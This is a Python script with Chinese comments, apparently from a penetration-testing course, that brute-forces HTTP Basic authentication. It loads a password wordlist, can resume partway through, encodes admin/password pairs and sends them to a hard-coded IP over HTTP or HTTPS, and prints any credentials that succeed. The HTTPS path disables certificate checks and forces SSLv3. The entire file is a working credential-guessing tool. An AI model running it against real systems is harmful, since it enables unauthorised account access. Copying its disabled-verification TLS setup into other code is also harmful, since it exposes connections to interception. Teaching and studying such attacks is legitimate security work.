#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

import urllib.request
from bs4 import BeautifulSoup
from multiprocessing import Process,Queue
from base64 import b64encode
import ssl
import requests
from http.client import HTTPSConnection
from http.client import HTTPConnection


user_thread = 1
username = "admin"
wordlist_file = "cain.txt"
resume = None#如果中途暂停，可以从上次结束的位置恢复

request_host = '202.100.1.1'

#生成密码字典
def build_wordlist(wordlist_file):
	fd = open(wordlist_file, "rb")
	raw_words = fd.readlines()
	fd.close()

	found_resume = False
	words = Queue()

	for word in raw_words:
		word = word.rstrip()

		if resume is not None:#如果有上次的暂停存在
			if found_resume:#如果找到了暂停的位置，就继续把密码写入队列
				words.put(word)
			else:
				if word == resume:#如果找到了上次暂停所有在位置的密码
					found_resume = True#设置found_resume，后面就从此处往后开始猜测密码
					print("Resuming wordlist from: %s" % resume)
		else:
			words.put(word)#如果没有上次暂停就直接把密码写入队列

	return words

def http_client(server, URI = '/', data = None, header = None, opt = 1, sslenable = 0):
	if sslenable == 0:
		server = HTTPConnection(server, 80)
	elif sslenable == 1:
		context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)#ssl支持的协议版本
		#context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)#ssl支持的协议版本
		context.verify_mode = ssl.CERT_NONE#CERT_NONE, CERT_OPTIONAL or CERT_REQUIRED（并不检查证书有效性）
		context.load_verify_locations('/usr/share/kde4/apps/kssl/ca-bundle.crt')#根证书文件

		server = HTTPSConnection(server, 443, context=context)

	if opt == 1:
		if data != None and header != None:
			server.request('POST', URI, body = data, headers = header)
		elif data != None and header == None:
			server.request('POST', URI, body = data)
		elif data == None and header != None:
			server.request('POST', URI, headers = header)
		else:
			server.request('POST', URI)

	elif opt == 2:
		if data != None and header != None:
			server.request('GET', URI, body = data, headers = header)
		elif data != None and header == None:
			server.request('GET', URI, body = data)
		elif data == None and header != None:
			server.request('GET', URI, headers = header)
		else:
			server.request('GET', URI)

	reply = server.getresponse()

	if reply.status != 200:
		#print('Error sending request!\n', 'status: ', reply.status, '\n reason: ', reply.reason)
		return None
	else:
		return reply.read(), reply.getheaders()

class Bruter(object):
	def __init__(self, username, words, sslopt = 0):
		self.username = username#用户名
		self.password_q = words#密码的队列
		self.found = False
		self.sslenable = sslopt
		print("Finished setting up for: %s" % username)

	def web_bruter(self):
		while not self.password_q.empty() and not self.found:#如果队列不为空，并且并没有找到！
			brute = self.password_q.get().rstrip()#提取密码

			user_pass_str = username + ':' + brute.decode()
			user_pass_str_encode = user_pass_str.encode()
			userAndPass = b64encode(user_pass_str_encode).decode("ascii")
			request_headers = {}
			request_headers['Authorization'] = 'Basic %s' %  userAndPass
			#加入Base64编码的用户名和密码信息
			http_result = http_client(request_host, URI = '/', header = request_headers, opt = 2, sslenable = self.sslenable)

			if http_result != None:
				self.found = True
				print("[*] Bruteforce successful.")
				print("[*] username: %s" % username)
				print("[*] password: %s" % brute)
				print("[*] waiting for other threads to exit...")

	def run_bruteforce(self):
		for i in range(user_thread):
			t = Process(target=self.web_bruter)
			t.start()

if __name__ == '__main__':
	words = build_wordlist(wordlist_file)
	#bruter_obj = Bruter(username, words, 0)#0为http
	bruter_obj = Bruter(username, words, 1)#1为https
	bruter_obj.run_bruteforce()